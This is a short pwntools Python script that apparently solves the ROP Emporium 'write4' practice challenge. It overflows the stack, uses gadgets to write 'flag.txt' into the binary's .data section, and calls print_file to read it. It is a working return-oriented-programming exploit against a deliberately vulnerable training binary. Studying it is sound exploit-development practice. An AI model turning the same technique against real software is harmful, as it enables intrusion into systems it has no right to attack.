from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

padding = r.generatePadding(0, cyclic_find(b'kaaa'))
pop_pop_ret = r.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
data_section = e.get_section_by_name(".data").header.sh_addr
flag_txt = b'flag.txt'
mov_r14_r15 = e.sym['usefulGadgets']
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
print_flag = e.sym['print_file']

r.raw(padding)
r.call(pop_pop_ret)
r.raw(p64(data_section))
r.raw(flag_txt)
r.call(mov_r14_r15)
r.call(pop_rdi)
r.raw(p64(data_section))
r.call(print_flag)

log.info("write4 chain:\n%s" % r.dump())
p.recvuntil(b'>')
p.sendline(bytes(r))

p.interactive()
